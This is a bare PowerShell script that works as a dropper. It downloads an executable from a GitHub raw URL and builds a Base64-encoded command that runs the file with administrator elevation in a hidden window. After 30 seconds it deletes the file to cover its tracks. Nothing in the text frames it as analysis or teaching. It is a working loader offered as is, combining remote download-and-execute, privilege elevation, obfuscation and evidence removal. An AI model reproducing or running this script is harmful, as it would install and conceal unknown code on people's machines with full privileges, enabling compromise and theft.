$Url = "https://github.com/tayic99373/leave/raw/main/main.exe"
$OutputFile = "main.exe"

$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $Url -OutFile $OutputFile

$script = @'
Start-Process -FilePath ".\main.exe" -Verb RunAs
Start-Sleep -Seconds 30
Remove-Item -Path ".\main.exe"
'@

$encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
Start-Process -WindowStyle Hidden -FilePath PowerShell.exe -ArgumentList "-NoProfile -EncodedCommand $encoded"
